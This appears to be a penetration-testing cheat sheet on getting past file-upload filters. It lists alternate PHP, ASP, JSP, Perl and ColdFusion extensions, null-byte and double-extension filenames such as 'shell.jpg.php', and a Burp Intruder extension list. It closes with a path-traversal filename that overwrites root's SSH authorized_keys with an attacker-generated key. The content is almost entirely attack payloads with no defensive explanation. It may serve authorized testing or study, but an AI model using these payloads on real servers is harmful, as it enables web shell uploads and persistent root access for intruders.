# Blacklisting bypass
## PHP
```
pht, phpt, phtml, php3, php4, php5, php6
```

## asp
```
asp, aspx
```

## perl
```
pl, pm, cgi, lib
```

## jsp
```
jsp, jspx, jsw, jsv, jspf
```

## coldfusion
```
cfm, cfml, cfc, dbm
```

# Whitelisting bypass
null byte injection
```
shel.php$00.gif
```

double extension
```
shell.jpg.php
```

# Bruteforcing extensions

using Burp with intruder

php
```
php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
```

asp
```
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
```

jsp
```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```

coldfusion
```
.cfm, .cfml, .cfc, .dbm
```

perl
```
.pl, .cgi
```

# Non-Executable Files

## overwrite authorized_keys
key-gen
```
ssh-keygen -f fileup
```

```
cat fileup.pub > authorized_keys
```

overwrite path
```
../../../../../../../root/.ssh/authorized_keys
```